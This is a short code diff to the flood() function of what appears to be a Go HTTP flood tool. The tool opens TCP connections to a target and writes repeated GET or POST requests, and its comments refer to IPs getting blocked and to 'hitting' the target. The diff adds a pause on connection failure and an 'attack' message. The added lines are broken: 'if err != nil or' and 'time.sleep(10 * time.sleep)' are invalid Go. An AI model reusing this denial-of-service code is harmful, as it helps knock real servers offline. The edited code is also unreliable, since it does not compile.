@@ -196,9 +196,12 @@ func flood() {
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
-		if err != nil {
-			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
-		} else {
+		if err != nil or {
+			fmt.Println("Connection Down!!! Taking some time off. ") //When showing this message, it means ur ip got blocked or the target server down.
+			time.sleep(10 * time.sleep)
+			
+		} // else {
+		        fmt.Println("Commencing the attack now...")
 			for i := 0; i < 100; i++ {
 				request := ""
 				if os.Args[3] == "get" {
@@ -209,7 +212,7 @@ func flood() {
 				s.Write([]byte(request))
 			}
 			s.Close()
-		}
+		// }
 		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
